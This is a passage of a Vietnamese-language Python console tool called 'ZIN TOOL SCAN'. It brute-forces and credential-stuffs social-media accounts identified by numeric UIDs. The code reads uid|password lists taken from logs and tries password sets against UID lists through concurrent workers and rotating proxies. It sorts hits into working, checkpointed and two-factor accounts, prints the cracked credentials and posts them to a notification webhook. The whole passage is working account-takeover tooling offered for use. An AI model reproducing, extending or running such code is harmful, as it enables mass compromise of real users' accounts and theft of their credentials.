        if hien_tai - self.thong_ke._lan_cap_nhat < 0.15:
            return
        self.thong_ke._lan_cap_nhat = hien_tai
        self._kiem_tra_flag()

        RONG = 44
        chuoi = self.thong_ke.dong_trang_thai()
        do_dai = _rong_hien_thi(chuoi)
        if do_dai > RONG:
            chuoi = _cat_theo_rong(chuoi, RONG)
            do_dai = _rong_hien_thi(chuoi)
        if do_dai < RONG:
            chuoi = chuoi + " " * (RONG - do_dai)
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r" + chuoi)
                sys.stdout.flush()
        except OSError:
            pass

    def _hop(self, mau, tieu_de, uid, mat_khau, proxy):
        vien = "═" * 40
        dong = [
            f"  {mau}{C.B}╔{vien}╗{C.R}",
            f"  {mau}{C.B}║{C.R} {mau_cau_vong(tieu_de)}",
            f"  {mau}{C.B}║{C.R} {C.CYAN}UID  :{C.R} "
            f"{C.WHITE}{C.B}{uid}{C.R}",
            f"  {mau}{C.B}║{C.R} {C.YELLOW}MẬT KHẨU:{C.R} "
            f"{C.WHITE}{C.B}{mat_khau}{C.R}",
        ]
        if proxy:
            dong.append(
                f"  {mau}{C.B}║{C.R} {C.GRAY}PROXY:{C.R} "
                f"{C.WHITE}{proxy}{C.R}")
        dong.append(f"  {mau}{C.B}╚{vien}╝{C.R}")
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r" + " " * 44 + "\r")
                sys.stdout.write("\n".join(dong) + "\n")
                sys.stdout.flush()
        except OSError:
            pass
        tieng_keo()

    def _ve_thanh_cong(self, uid, mat_khau, proxy):
        if _HOAT_HINH_OK:
            nhap_nhay("✨ THÀNH CÔNG ✨", mau=C.GREEN,
                       so_lan=2, do_tre=0.12, le="  ")
        self._hop(C.GREEN, "✨ THÀNH CÔNG ✨", uid, mat_khau, proxy)

    def _ve_cp_that(self, uid, mat_khau, proxy):
        if _HOAT_HINH_OK:
            nhap_nhay("🎯 CP THẬT (ĐÀO ĐƯỢC)", mau=C.GOLD,
                       so_lan=2, do_tre=0.12, le="  ")
        self._hop(C.GOLD, "🎯 CP THẬT — ACC ĐÀO ĐƯỢC",
                  uid, mat_khau, proxy)

    def _ve_hai_buoc(self, uid, mat_khau, proxy):
        if _HOAT_HINH_OK:
            nhap_nhay("🔐 XÁC MINH 2 BƯỚC 🔐", mau=C.PINK,
                       so_lan=2, do_tre=0.12, le="  ")
        self._hop(C.PINK, "🔐 XÁC MINH 2 BƯỚC", uid, mat_khau, proxy)

    async def _bao_webhook(self, trang_thai, uid, mat_khau, proxy):
        if not CONFIG["notify_webhook"] or not self.client:
            return
        noi_dung = {
            "content": f"**[{trang_thai}]** Trúng!\n"
                       f"UID: `{uid}`\nMật khẩu: `{mat_khau}`\n"
                       f"Proxy: `{proxy or 'không'}`"
        }
        t = asyncio.create_task(self._gui_webhook_an_toan(noi_dung))
        self.tac_vu_webhook.add(t)
        t.add_done_callback(self.tac_vu_webhook.discard)

    async def _gui_webhook_an_toan(self, noi_dung):
        try:
            await asyncio.wait_for(
                self.client.post(CONFIG["notify_webhook"],
                                  json=noi_dung),
                timeout=CONFIG["webhook_timeout"],
            )
        except (httpx.HTTPError, asyncio.TimeoutError,
                asyncio.CancelledError):
            pass
        except Exception:
            pass


_STOP_EVENT = None


def cai_dat_tin_hieu(vong_lap, su_kien_dung):
    def _xu_ly():
        su_kien_dung.set()
    for tin_hieu in (signal.SIGINT, signal.SIGTERM):
        try:
            vong_lap.add_signal_handler(tin_hieu, _xu_ly)
        except (NotImplementedError, RuntimeError, ValueError):
            pass


class UngDungZin:
    MENU = (
        ("1", "2011-2012", C.PINK, "🌸"),
        ("2", "2010", C.CRIMSON, "🔥"),
        ("3", "2009", C.ORANGE, "🍊"),
        ("4", "2008", C.GOLD, "🌟"),
        ("5", "2007", C.LIME, "🍀"),
        ("6", "2005-2006", C.AQUA, "💎"),
        ("7", "NGẪU NHIÊN", C.VIOLET, "🎲"),
        ("8", "SCAN VIA FILE", C.MINT, "📁"),
        ("9", "SCAN UID LIST", C.SKY, "📋"),
        ("0", "THOÁT", C.GRAY, "🚪"),
    )

    def chay(self):
        in_logo_vo_han()
        print(f"  {C.VIOLET}{C.B}[ CHỌN PHƯƠNG PHÁP ]{C.R}")
        vach_ngan()
        for so, ten, mau, bieu_tuong in self.MENU:
            if ten == "THOÁT":
                print(f"  {mau}{C.B}[{C.WHITE}{so}{mau}]{C.R} "
                      f"{bieu_tuong}  {C.B}{ten}{C.R}")
            elif ten == "NGẪU NHIÊN":
                print(f"  {mau}{C.B}[{C.WHITE}{so}{mau}]{C.R} "
                      f"{bieu_tuong}  "
                      f"{mau_cau_vong('NGẪU NHIÊN (Mọi Series)',
                                      palette=RAINBOW3)}")
            elif ten == "SCAN VIA FILE":
                print(f"  {mau}{C.B}[{C.WHITE}{so}{mau}]{C.R} "
                      f"{bieu_tuong}  "
                      f"{mau_cau_vong('SCAN VIA FILE (Đào acc từ log)',
                                      palette=RAINBOW3)}")
            elif ten == "SCAN UID LIST":
                print(f"  {mau}{C.B}[{C.WHITE}{so}{mau}]{C.R} "
                      f"{bieu_tuong}  "
                      f"{mau_cau_vong('SCAN UID LIST (Brute-force)',
                                      palette=RAINBOW3)}")
            else:
                print(f"  {mau}{C.B}[{C.WHITE}{so}{mau}]{C.R} "
                      f"{bieu_tuong}  {C.B}{ten}{C.R} METHOD")
        vach_ngan()
        print(f"  {mau_cau_vong('⚡ ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN')}")
        print()
        try:
            chon = input(f"  {C.CYAN}{C.B}➤ Chọn: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)

        if chon == "0":
            self.tam_biet()
        if chon == "8":
            self.chay_scan_file()
            return
        if chon == "9":
            self.chay_scan_uid_list()
            return
        if chon not in SERIES_MAP:
            print(f"  {C.RED}✗ Lựa chọn không hợp lệ{C.R}")
            time.sleep(1)
            self.chay()
            return
        ten, tien_to, do_dai = SERIES_MAP[chon]
        self.chay_kiem_tra(ten, tien_to, do_dai)

    def tam_biet(self):
        in_logo(hoat_hinh=False)
        print()
        hop_can_giua("HẸN GẶP LẠI")
        print()
        print("  " + vien_cau_vong("✦", palette=RAINBOW2))
        print()
        hieu_ung_song("✦ Cảm ơn đã sử dụng ZIN ✦",
                       palette=RAINBOW3, thoi_gian=1.0, do_tre=0.05)
        print()
        sys.exit(0)

    def chay_scan_file(self):
        in_logo(hoat_hinh=False)
        print(f"  {C.MINT}{C.B}📁 SCAN VIA FILE — Đào acc từ log{C.R}")
        vach_ngan()
        print(f"  {C.GRAY}File cần có dạng: {C.WHITE}uid|password"
              f"{C.GRAY} (hoặc {C.WHITE}uid:password{C.GRAY}){C.R}")
        print(f"  {C.GRAY}Ví dụ: {C.WHITE}10000123456|123123{C.R}")
        print(f"  {C.GRAY}Delimiter tự nhận: {C.WHITE}| : ; , Tab space"
              f"{C.R}")
        vach_ngan()
        print()

        duong_dan_mac_dinh = str(Path.home() / "input.txt")
        try:
            nhap = input(
                f"  {C.CYAN}{C.B}➤ Đường dẫn file "
                f"{C.GRAY}(Enter = {duong_dan_mac_dinh}){C.R}"
                f"{C.CYAN}: {C.R}"
            ).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            self.chay()
            return
        if not nhap:
            nhap = duong_dan_mac_dinh
        duong_dan = Path(nhap).expanduser()

        if not duong_dan.is_file():
            print(f"  {C.RED}✗ File không tồn tại: {duong_dan}{C.R}")
            time.sleep(2)
            self.chay()
            return

        xoay_tron("Đang đọc file...", thoi_gian=0.4)
        try:
            doc_file = BoDocFile(duong_dan)
            doc_file.doc()
        except IOError as e:
            print(f"  {C.RED}✗ {e}{C.R}")
            time.sleep(2)
            self.chay()
            return

        in_logo(hoat_hinh=False)
        print(f"  {C.MINT}{C.B}📁 File: {C.WHITE}{duong_dan.name}{C.R}")
        vach_ngan()
        print(f"  {C.GREEN}✓{C.R} Tổng dòng       "
              f"{C.GRAY}▸{C.R} {C.WHITE}{doc_file.tong_dong}{C.R}")
        print(f"  {C.GREEN}✓{C.R} Hợp lệ          "
              f"{C.GRAY}▸{C.R} {C.GREEN}{C.B}{doc_file.hop_le}{C.R}")
        print(f"  {C.YELLOW}•{C.R} Bỏ qua          "
              f"{C.GRAY}▸{C.R} {C.WHITE}{doc_file.bo_qua}{C.R}")
        print(f"  {C.YELLOW}•{C.R} Trùng lặp        "
              f"{C.GRAY}▸{C.R} {C.WHITE}{doc_file.trung_lap}{C.R}")
        if doc_file.vi_du():
            print(f"  {C.GRAY}Preview 3 dòng đầu:{C.R}")
            for uid, pw in doc_file.vi_du():
                print(f"    {C.GRAY}▸{C.R} {C.CYAN}{uid}{C.R}"
                      f"{C.GRAY}|{C.R}{C.WHITE}{pw}{C.R}")
        vach_ngan()

        if doc_file.hop_le == 0:
            print(f"  {C.RED}✗ File không có dòng hợp lệ nào{C.R}")
            time.sleep(2)
            self.chay()
            return

        print()
        print(f"  {C.MINT}{C.B}Workers [10 - 50]{C.R} "
              f"{C.GRAY}(Enter = 30){C.R}")
        try:
            nhap_w = input(f"  {C.CYAN}{C.B}➤ Số workers: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            self.chay()
            return

        if nhap_w == "":
            workers = 30
        else:
            try:
                workers = int(nhap_w)
            except (ValueError, TypeError):
                print(f"  {C.RED}✗ Không phải số{C.R}")
                time.sleep(1)
                self.chay_scan_file()
                return
            if not (10 <= workers <= 50):
                print(f"  {C.RED}✗ Phải trong khoảng 10-50{C.R}")
                time.sleep(1)
                self.chay_scan_file()
                return

        try:
            asyncio.run(self._chay_scan_file_bat_dong_bo(
                duong_dan, doc_file, workers))
        except KeyboardInterrupt:
            print(f"\n  {C.RED}⏹ Dừng bởi người dùng{C.R}")

    async def _chay_scan_file_bat_dong_bo(self, duong_dan, doc_file,
                                            workers):
        global _STOP_EVENT
        _STOP_EVENT = asyncio.Event()
        vong_lap = asyncio.get_running_loop()
        cai_dat_tin_hieu(vong_lap, _STOP_EVENT)

        CONFIG["concurrency"] = workers
        thong_ke = ThongKe()
        thong_ke.uid_tong = doc_file.hop_le

        tieu_de_dong = TieuDeDong()
        tieu_de_dong.bat_dau(thong_ke)

        quan_ly_proxy = QuanLyProxy(CONFIG["proxy_file"])

        in_logo(hoat_hinh=False)
        print(f"  {C.MINT}{C.B}📁 SCAN VIA FILE{C.R}")
        vach_ngan()
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} FILE         "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{duong_dan.name}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TỔNG CẶP     "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{doc_file.hop_le}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} WORKERS      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{workers}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TIMEOUT      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{CONFIG['timeout']}s{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} KẾT QUẢ      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}IN TRỰC TIẾP{C.R}")
        vach_ngan()
        print(f"  {mau_cau_vong('⚡ ZIN TOOL SCAN — SCAN VIA FILE')}")
        vach_ngan()
        print()

        xoay_tron("Khởi động", thoi_gian=0.6)
        cham_cho("Chuẩn bị hàng đợi", thoi_gian=0.4)
        print()

        hang_doi = asyncio.Queue(maxsize=max(400, workers * 4))
        for uid, pw in doc_file.danh_sach:
            await hang_doi.put((uid, pw))
        san_xuat_xong = asyncio.Event()
        san_xuat_xong.set()

        async def cong_nhan(bo_kiem_tra):
            while True:
                try:
                    uid, pw = await asyncio.wait_for(
                        hang_doi.get(),
                        timeout=CONFIG["worker_poll_timeout"],
                    )
                except asyncio.TimeoutError:
                    if san_xuat_xong.is_set() and hang_doi.empty():
                        return
                    continue
                except asyncio.CancelledError:
                    return
                try:
                    if not _STOP_EVENT.is_set():
                        await bo_kiem_tra._kiem_tra_1_cap(uid, pw)
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    bo_kiem_tra.thong_ke.loi_uid += 1
                    sys.stderr.write(
                        f"[Công Nhân] uid={uid} "
                        f"{type(e).__name__}: {e}\n")
                finally:
                    hang_doi.task_done()

        async with BoKiemTra(quan_ly_proxy, thong_ke,
                              None, None, mode="file") as bo_kiem_tra:
            danh_sach_cong_nhan = [
                asyncio.create_task(cong_nhan(bo_kiem_tra))
                for _ in range(workers)
            ]
            try:
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            except asyncio.CancelledError:
                for cn in danh_sach_cong_nhan:
                    cn.cancel()
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            finally:
                for cn in danh_sach_cong_nhan:
                    if not cn.done():
                        cn.cancel()
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            ds_ok = list(bo_kiem_tra._ds_ok)

        tieu_de_dong.dung()
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r" + " " * 44 + "\r")
                sys.stdout.flush()
        except OSError:
            pass

        self._in_tong_ket_file(thong_ke, workers, duong_dan, ds_ok)
        try:
            input(f"  {C.CYAN}➤ Nhấn Enter để thoát...{C.R}")
        except (EOFError, KeyboardInterrupt):
            print()

    def _in_tong_ket_file(self, thong_ke, workers, duong_dan, ds_ok):
        sai = max(0, thong_ke.da_thu - thong_ke.thanh_cong
                  - thong_ke.cp_that - thong_ke.cp_nghi_ngo
                  - thong_ke.cp_gia - thong_ke.hai_buoc
                  - thong_ke.loi_request)
        ty_le_flag = thong_ke.ty_le_cp_nghi_ngo()
        print()
        print("  " + vien_cau_vong("═"))
        print()
        hop_can_giua("✦ HOÀN TẤT ✦")
        print()
        print("  " + vien_cau_vong("═", palette=RAINBOW2))
        print()
        print(f"  {C.MINT}{C.B}File nguồn       {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{duong_dan.name}{C.R}")
        print(f"  {C.MINT}{C.B}Workers         {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{workers}{C.R}")
        print(f"  {C.GREEN}{C.B}OK (log được)   {C.R}{C.GRAY}▸{C.R} "
              f"{C.GREEN}{C.B}{thong_ke.thanh_cong}{C.R}")
        print(f"  {C.GOLD}{C.B}CP THẬT (đào)   {C.R}{C.GRAY}▸{C.R} "
              f"{C.GOLD}{C.B}{thong_ke.cp_that}{C.R}")
        print(f"  {C.YELLOW}{C.B}CP nghi ngờ     {C.R}{C.GRAY}▸{C.R} "
              f"{C.YELLOW}{C.B}{thong_ke.cp_nghi_ngo}{C.R}")
        print(f"  {C.CRIMSON}{C.B}CP GIẢ          {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.cp_gia}{C.R}")
        print(f"  {C.CRIMSON}{C.B}UID bị CP       {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}"
              f"{thong_ke.uid_cp_nghi + thong_ke.uid_cp_gia}"
              f"/{thong_ke.uid_da_xu_ly} "
              f"({ty_le_flag*100:.0f}%){C.R}")
        print(f"  {C.PINK}{C.B}2FA             {C.R}{C.GRAY}▸{C.R} "
              f"{C.PINK}{C.B}{thong_ke.hai_buoc}{C.R}")
        print(f"  {C.CRIMSON}{C.B}Sai pass        {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{sai}{C.R}")
        print(f"  {C.CRIMSON}{C.B}Lỗi Request     {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.loi_request}{C.R}")
        print(f"  {C.CYAN}{C.B}Đã Thử          {C.R}{C.GRAY}▸{C.R} "
              f"{C.CYAN}{C.B}{thong_ke.da_thu}/"
              f"{thong_ke.uid_tong}{C.R}")
        print(f"  {C.VIOLET}{C.B}Thời Gian       {C.R}{C.GRAY}▸{C.R} "
              f"{C.VIOLET}{C.B}{thong_ke.thoi_gian_chay():.1f} giây{C.R}")
        print(f"  {C.SKY}{C.B}Tốc Độ          {C.R}{C.GRAY}▸{C.R} "
              f"{C.SKY}{C.B}{thong_ke.toc_do():.1f}/giây{C.R}")
        if thong_ke._da_abort:
            print()
            print(f"  {C.RED}{C.B}🚨 Session đã bị ABORT do IP bị flag "
                  f"({ty_le_flag*100:.0f}% UID CP){C.R}")
        print()

        if ds_ok:
            print("  " + vien_cau_vong("═", palette=RAINBOW3))
            print()
            hop_can_giua(f"🎉 {len(ds_ok)} TÀI KHOẢN ĐÀO ĐƯỢC 🎉")
            print()
            print("  " + vien_cau_vong("─", palette=RAINBOW3))
            print()
            for i, (uid, pw) in enumerate(ds_ok, 1):
                nam = lay_nam_tai_khoan(uid)
                print(f"  {C.GREEN}{C.B}[{i:>3}]{C.R} "
                      f"{C.CYAN}{uid}{C.R}"
                      f"{C.GRAY}|{C.R}"
                      f"{C.WHITE}{C.B}{pw}{C.R} "
                      f"{C.GRAY}({nam}){C.R}")
            print()
            print("  " + vien_cau_vong("─", palette=RAINBOW3))
            print()
            print(f"  {C.YELLOW}{C.B}📋 COPY NHANH "
                  f"(UID|PASSWORD):{C.R}")
            print()
            for uid, pw in ds_ok:
                print(f"  {C.WHITE}{uid}|{pw}{C.R}")
            print()
        else:
            print(f"  {C.RED}{C.B}✗ Không có tài khoản nào đào được "
                  f"trong file này{C.R}")
            print()

        print("  " + vien_cau_vong("✦"))
        print()

    def chay_scan_uid_list(self):
        in_logo(hoat_hinh=False)
        print(f"  {C.SKY}{C.B}📋 SCAN UID LIST — Brute-force UID{C.R}")
        vach_ngan()
        print(f"  {C.GRAY}Tool sẽ thử password theo mode con (1-4) "
              f"cho từng UID{C.R}")
        vach_ngan()
        print()
        print(f"  {C.VIOLET}{C.B}[ CHỌN NGUỒN UID ]{C.R}")
        vach_ngan()
        print(f"  {C.LIME}{C.B}[1]{C.R} 📁 Từ file .txt")
        print(f"  {C.CYAN}{C.B}[2]{C.R} ⌨  Nhập trực tiếp (paste)")
        print(f"  {C.GRAY}{C.B}[0]{C.R} 🚪 Quay lại")
        vach_ngan()
        print()
        try:
            chon = input(f"  {C.CYAN}{C.B}➤ Chọn: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            self.chay()
            return

        if chon == "0":
            self.chay()
            return
        if chon not in ("1", "2"):
            print(f"  {C.RED}✗ Lựa chọn không hợp lệ{C.R}")
            time.sleep(1)
            self.chay_scan_uid_list()
            return

        doc_uid = BoDocUID()

        if chon == "1":
            duong_dan_mac_dinh = str(Path.home() / "uids.txt")
            try:
                nhap = input(
                    f"  {C.CYAN}{C.B}➤ Đường dẫn file "
                    f"{C.GRAY}(Enter = {duong_dan_mac_dinh}){C.R}"
                    f"{C.CYAN}: {C.R}"
                ).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self.chay()
                return
            if not nhap:
                nhap = duong_dan_mac_dinh
            duong_dan = Path(nhap).expanduser()
            if not duong_dan.is_file():
                print(f"  {C.RED}✗ File không tồn tại: {duong_dan}{C.R}")
                time.sleep(2)
                self.chay_scan_uid_list()
                return
            xoay_tron("Đang đọc file...", thoi_gian=0.4)
            try:
                doc_uid.doc_file(duong_dan)
            except IOError as e:
                print(f"  {C.RED}✗ {e}{C.R}")
                time.sleep(2)
                self.chay_scan_uid_list()
                return
            ten_nguon = duong_dan.name
        else:
            in_logo(hoat_hinh=False)
            print(f"  {C.SKY}{C.B}⌨  NHẬP DANH SÁCH UID{C.R}")
            vach_ngan()
            print(f"  {C.GRAY}▸ Mỗi dòng 1 UID, HOẶC nhiều UID cách nhau "
                  f"bởi space/phẩy{C.R}")
            print(f"  {C.GRAY}▸ Gõ {C.WHITE}{C.B}END{C.R}"
                  f"{C.GRAY} hoặc để trống để kết thúc{C.R}")
            print(f"  {C.GRAY}▸ Ví dụ: {C.WHITE}10000123456{C.R}"
                  f"{C.GRAY} hoặc {C.WHITE}"
                  f"10000123456 10000987654{C.R}")
            vach_ngan()
            print()
            print(f"  {C.CYAN}{C.B}▼ Nhập bên dưới (Ctrl+C để hủy):{C.R}")
            print()
            try:
                so_dong = 0
                while True:
                    dong = input(f"  {C.CYAN}▸ {C.R}")
                    if not dong.strip() or dong.strip().upper() == "END":
                        break
                    so_dong += 1
                    doc_uid.them_dong(dong)
                    if so_dong % 10 == 0:
                        with _STDOUT_KHOA:
                            sys.stdout.write(
                                f"\r  {C.GRAY}... đã nhập "
                                f"{doc_uid.hop_le} UID hợp lệ{C.R}\033[K")
                            sys.stdout.flush()
                print()
            except (EOFError, KeyboardInterrupt):
                print()
            ten_nguon = "nhập trực tiếp"

        in_logo(hoat_hinh=False)
        print(f"  {C.SKY}{C.B}📋 Nguồn: {C.WHITE}{ten_nguon}{C.R}")
        vach_ngan()
        print(f"  {C.GREEN}✓{C.R} Tổng dòng       "
              f"{C.GRAY}▸{C.R} {C.WHITE}{doc_uid.tong_dong}{C.R}")
        print(f"  {C.GREEN}✓{C.R} UID hợp lệ     "
              f"{C.GRAY}▸{C.R} {C.GREEN}{C.B}{doc_uid.hop_le}{C.R}")
        print(f"  {C.YELLOW}•{C.R} Bỏ qua          "
              f"{C.GRAY}▸{C.R} {C.WHITE}{doc_uid.bo_qua}{C.R}")
        print(f"  {C.YELLOW}•{C.R} Trùng lặp        "
              f"{C.GRAY}▸{C.R} {C.WHITE}{doc_uid.trung_lap}{C.R}")
        if doc_uid.vi_du():
            print(f"  {C.GRAY}Preview 3 UID đầu:{C.R}")
            for uid in doc_uid.vi_du():
                print(f"    {C.GRAY}▸{C.R} {C.CYAN}{uid}{C.R}")
        vach_ngan()

        if doc_uid.hop_le == 0:
            print(f"  {C.RED}✗ Không có UID hợp lệ{C.R}")
            time.sleep(2)
            self.chay()
            return

        print()
        self._hien_thi_scan_modes()
        try:
            chon_m = input(
                f"  {C.CYAN}{C.B}➤ Chọn mode password (1-4) "
                f"hoặc 0 quay lại: {C.R}"
            ).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            self.chay()
            return

        if chon_m == "0":
            self.chay()
            return
        if chon_m not in SCAN_MODES:
            print(f"  {C.RED}✗ Lựa chọn không hợp lệ{C.R}")
            time.sleep(1)
            self.chay_scan_uid_list()
            return

        cfg = SCAN_MODES[chon_m]
        mode = cfg["password_mode"]
        workers = self._chon_workers(cfg)
        if workers is None:
            self.chay_scan_uid_list()
            return

        try:
            asyncio.run(self._chay_uid_list_bat_dong_bo(
                doc_uid, mode, workers, cfg, ten_nguon))
        except KeyboardInterrupt:
            print(f"\n  {C.RED}⏹ Dừng bởi người dùng{C.R}")

    async def _chay_uid_list_bat_dong_bo(self, doc_uid, mode, workers,
                                           cfg, ten_nguon):
        global _STOP_EVENT
        _STOP_EVENT = asyncio.Event()
        vong_lap = asyncio.get_running_loop()
        cai_dat_tin_hieu(vong_lap, _STOP_EVENT)

        CONFIG["concurrency"] = workers
        CONFIG["queue_maxsize"] = max(400, workers * 4)

        quan_ly_proxy = QuanLyProxy(CONFIG["proxy_file"])
        thong_ke = ThongKe()
        thong_ke.uid_tong = doc_uid.hop_le

        tieu_de_dong = TieuDeDong()
        tieu_de_dong.bat_dau(thong_ke)

        nhan_series = "uidlist"
        ghi_file = QuanLyGhiFile(CONFIG["output_dir"],
                                   nhan_series=nhan_series)
        ghi_file.chuan_bi()
        trang_thai = None

        so_mk = dem_mat_khau_mode(mode)

        in_logo(hoat_hinh=False)
        print(f"  {C.SKY}{C.B}📋 SCAN UID LIST{C.R}")
        vach_ngan()
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} NGUỒN        "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{ten_nguon}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TỔNG UID     "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{doc_uid.hop_le}{C.R}")
        print(f"  {cfg['color']}{C.B}[ ✓ ]{C.R} MODE         "
              f"{C.GRAY}▸{C.R} {cfg['color']}{C.B}"
              f"{cfg['icon']} {cfg['name']}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} WORKERS      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{workers}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} MẬT KHẨU/UID "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{so_mk}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TIMEOUT      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{CONFIG['timeout']}s{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} PROXY        "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}"
              f"{len(quan_ly_proxy.danh_sach) if CONFIG['enable_proxy'] else 'TẮT'}"
              f"{C.R}")
        vach_ngan()
        print(f"  {mau_cau_vong('⚡ ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN')}")
        vach_ngan()
        print()

        xoay_tron("Khởi động hệ thống", thoi_gian=0.6)
        cham_cho("Chuẩn bị hàng đợi", thoi_gian=0.4)
        print()

        hang_doi = asyncio.Queue(maxsize=CONFIG["queue_maxsize"])
        for uid in doc_uid.danh_sach:
            await hang_doi.put(uid)
        san_xuat_xong = asyncio.Event()
        san_xuat_xong.set()

        async def cong_nhan(bo_kiem_tra):
            while True:
                try:
                    uid = await asyncio.wait_for(
                        hang_doi.get(),
                        timeout=CONFIG["worker_poll_timeout"],
                    )
                except asyncio.TimeoutError:
                    if san_xuat_xong.is_set() and hang_doi.empty():
                        return
                    continue
                except asyncio.CancelledError:
                    return
                try:
                    if not _STOP_EVENT.is_set():
                        await bo_kiem_tra.kiem_tra_tai_khoan(uid)
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    bo_kiem_tra.thong_ke.loi_uid += 1
                    sys.stderr.write(
                        f"[Công Nhân] uid={uid} "
                        f"{type(e).__name__}: {e}\n")
                finally:
                    hang_doi.task_done()

        async with BoKiemTra(quan_ly_proxy, thong_ke,
                              ghi_file, trang_thai,
                              mode=mode) as bo_kiem_tra:
            danh_sach_cong_nhan = [
                asyncio.create_task(cong_nhan(bo_kiem_tra))
                for _ in range(workers)
            ]
            try:
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            except asyncio.CancelledError:
                for cn in danh_sach_cong_nhan:
                    cn.cancel()
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            except Exception as e:
                sys.stderr.write(f"[Chính] Lỗi: {e}\n")
            finally:
                for cn in danh_sach_cong_nhan:
                    if not cn.done():
                        cn.cancel()
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)

        try:
            await ghi_file.ket_thuc()
        except Exception:
            pass

        tieu_de_dong.dung()
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r" + " " * 44 + "\r")
                sys.stdout.write("\033]0;ZIN TOOL SCAN\007")
                sys.stdout.flush()
        except OSError:
            pass

        self._in_tong_ket(thong_ke, ghi_file, doc_uid.hop_le,
                           cfg, mode, workers)
        try:
            input(f"  {C.CYAN}➤ Nhấn Enter để thoát...{C.R}")
        except (EOFError, KeyboardInterrupt):
            print()

    def _hien_thi_scan_modes(self):
        print(f"  {C.VIOLET}{C.B}[ CHỌN TỐC ĐỘ SCAN ]{C.R}")
        vach_ngan()
        for khoa, cfg in SCAN_MODES.items():
            mau = cfg["color"]
            so_mk = dem_mat_khau_mode(cfg["password_mode"])
            w_min = cfg["min_workers"]
            w_max = cfg["max_workers"]
            w_def = cfg["default_workers"]
            print(f"  {mau}{C.B}[{C.WHITE}{khoa}{mau}]{C.R} "
                  f"{cfg['icon']} {mau}{C.B}{cfg['name']}{C.R}")
            print(f"       {C.GRAY}▸ {cfg['desc']}{C.R}")
            print(f"       {C.GRAY}▸ Mật khẩu: {C.WHITE}{C.B}{so_mk}{C.R}"
                  f" {C.GRAY}| Workers: {C.WHITE}{C.B}{w_min}-{w_max}"
                  f"{C.R} {C.GRAY}(mặc định {w_def}){C.R}")
        vach_ngan()

    def _chon_scan_mode(self):
        while True:
            self._hien_thi_scan_modes()
            try:
                chon = input(
                    f"  {C.CYAN}{C.B}➤ Chọn tốc độ (1-4) "
                    f"hoặc 0 để quay lại: {C.R}"
                ).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return None
            if chon == "0":
                return None
            if chon not in SCAN_MODES:
                print(f"  {C.RED}✗ Lựa chọn không hợp lệ{C.R}")
                time.sleep(1)
                continue
            cfg = SCAN_MODES[chon]
            workers = self._chon_workers(cfg)
            if workers is None:
                continue
            return cfg, workers

    def _chon_workers(self, cfg):
        w_min = cfg["min_workers"]
        w_max = cfg["max_workers"]
        w_def = cfg["default_workers"]
        print()
        print(f"  {cfg['color']}{C.B}Workers [{w_min} - {w_max}]{C.R} "
              f"{C.GRAY}(Enter = {w_def}){C.R}")
        try:
            nhap = input(f"  {C.CYAN}{C.B}➤ Số workers: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return None
        if nhap == "":
            return w_def
        try:
            w = int(nhap)
        except (ValueError, TypeError):
            print(f"  {C.RED}✗ Không phải số{C.R}")
            time.sleep(1)
            return self._chon_workers(cfg)
        if not (w_min <= w <= w_max):
            print(f"  {C.RED}✗ Phải trong khoảng {w_min}-{w_max}{C.R}")
            time.sleep(1)
            return self._chon_workers(cfg)
        return w

    def chay_kiem_tra(self, ten, tien_to, do_dai):
        in_logo(hoat_hinh=False)
